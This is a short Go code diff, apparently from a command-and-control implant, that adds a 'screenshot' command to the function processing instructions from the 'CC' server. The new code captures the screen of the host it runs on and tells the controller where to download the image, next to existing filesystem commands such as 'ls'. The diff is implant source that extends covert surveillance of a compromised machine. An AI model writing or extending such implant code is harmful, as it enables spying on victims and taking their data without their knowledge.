@@ -39,6 +39,28 @@ func processCCData(data *MsgTunData) {
 			goto send
 		}
 
+		/*
+			utils
+		*/
+		if cmdSlice[0] == "screenshot" {
+			if len(cmdSlice) != 1 {
+				return
+			}
+
+			out = util.Screenshot()
+			if out == "" {
+				out = "Error: failed to take screenshot"
+			}
+
+			// tell CC where to download the file
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			goto send
+		}
+
+		/*
+			fs commands
+		*/
+
 		// ls current path
 		if cmdSlice[0] == "ls" {
 			if len(cmdSlice) != 1 {
